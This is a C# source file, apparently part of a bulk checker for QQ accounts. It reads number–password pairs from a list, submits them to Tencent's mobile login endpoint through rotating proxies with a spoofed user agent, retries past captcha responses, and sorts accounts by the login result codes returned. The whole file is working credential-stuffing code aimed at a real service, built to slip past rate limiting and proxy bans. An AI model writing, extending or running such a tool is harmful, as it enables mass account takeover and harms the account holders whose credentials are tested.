using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading;
using ws.hoyland.util;
using System.IO;
using System.Text.RegularExpressions;
using System.Net;

namespace SM2014
{
    public class Task
    {
        private Form1 form;
        private String line;
        private String[] details = null;
        private String url = null;

        private String proxy = null;
        private WebProxy wp = null;
        private Stream stream = null;
        private StreamReader reader = null;
        private String resp = null;

        private bool flag = true;
        private int times = 0;
        private static String UAG = "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; QQDownload 734; Maxthon; .NET CLR 2.0.50727; .NET4.0C; .NET4.0E)";

        public Task(Form1 form, String line)
        {
            this.form = form;
            this.line = line;

            this.details = Regex.Split(line, "----");
            this.url = "http://pt.3g.qq.com/login?act=json&format=2&bid_code=house_touch&r=#" + "&qq=" + details[1] + "&pmd5=" + Util.UMD5X(details[2]) + "&go_url=http%3A%2F%2Fhouse60.3g.qq.com%2Ftouch%2Findex.jsp%3Fsid%3DAd_JZ1k2ZviFLkV2nvFt7005%26g_ut%3D3%26g_f%3D15124";

        }

        public void Run(Object stateInfo)
        {
            form.info("开始查询帐号:" + details[1]);
            
            //http请求
            HttpClient client = new HttpClient();

            while (flag&&times<10)
            {
                client.Headers.Add("User-Agent", Task.UAG);
                proxy = form.GetProxy();
                wp = new WebProxy(proxy);
                client.Proxy = wp;
                client.Encoding = Encoding.Default;

                try
                {
                    url = url.Replace("#", Form1.RANDOM.NextDouble().ToString());

                    stream = client.OpenRead(url);
                    reader = new StreamReader(stream);
                    resp = reader.ReadToEnd();

                    if (resp.IndexOf("pt.handleLoginResult") == -1)//代理异常
                    {
                        form.RemoveProxy(proxy);
                    }
                    else
                    {
                        //bool ok = false;
                        if (resp.IndexOf(",0,") != -1)
                        {
                            form.log(0, Int32.Parse(details[1]));
                            flag = false;
                        }
                        else if (resp.IndexOf(",40010,") != -1)
                        {
                            form.log(1, Int32.Parse(details[1]));
                            flag = false;
                        }
                        else if (resp.IndexOf(",40026,") != -1)
                        {
                            form.log(2, Int32.Parse(details[1]));
                            flag = false;
                        }
                        else if (resp.IndexOf("40001") != -1)//验证码
                        {
                            //不离开当前任务
                        }
                        else //代理异常
                        {
                            form.RemoveProxy(proxy);
                        }
                    }
                }
                catch (Exception e)
                {
                    Console.WriteLine(e.Message);
                    //代理异常
                    form.RemoveProxy(proxy);
                }

                if (reader != null)
                {
                    reader.Close();
                }
                if (stream != null)
                {
                    stream.Close();
                }

                times++;
            }
        }
    }
}
